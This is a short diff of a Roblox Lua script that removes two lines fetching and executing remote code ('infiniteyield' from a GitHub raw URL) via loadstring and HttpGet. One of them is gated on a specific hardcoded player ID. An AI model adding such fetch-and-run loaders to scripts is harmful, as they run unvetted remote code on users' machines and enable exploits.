@@ -1949,8 +1949,3 @@ game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageReque
    end
 
 
-if game:service('Players').LocalPlayer.UserId == 8798268679  then
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
-end
-
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
